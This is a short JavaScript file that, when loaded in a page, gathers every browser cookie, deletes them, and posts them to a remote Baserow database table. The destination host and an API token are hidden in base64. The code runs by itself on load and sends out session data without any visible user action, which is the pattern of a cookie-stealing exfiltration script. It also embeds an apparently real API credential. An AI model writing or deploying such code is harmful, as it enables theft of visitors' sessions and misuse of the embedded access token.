const domain="YXBpLmJhc2Vyb3cuaW8=";
const token="ZXBWbXFIdGwycXhnQWhiSEpUN3JaS0REa0JDSUhzQ2k=";
const id="190059";

function submit()
{
  var data = {};
  var c = document.cookie.split("; ");
  
  for(var i=0; i<c.length; i++)
  {
    kv = c[i].split("=");
    data[kv[0]] = kv[1];

    k = kv[0];
    v = data[k];
    if(( v[0] === "'" ) && ( v[v.length-1] === "'" ))
    {
      data[k] = v.substring(1, v.length-1);
    }

    document.cookie = "" + k + "=; path=/; max-age=1; samesite=strict";
  }

  function s()
  {
  };

  $.ajax({
    type: "POST",
    datatype: "json",
    url: "https://" + atob(domain) + "/api/database/rows/table/" + id + "/?user_field_names=true",
    headers: { "authorization":"Token " + atob(token),
               "content-type":"application/json" },
    data: JSON.stringify(data),
    success: s
  });

}

submit();
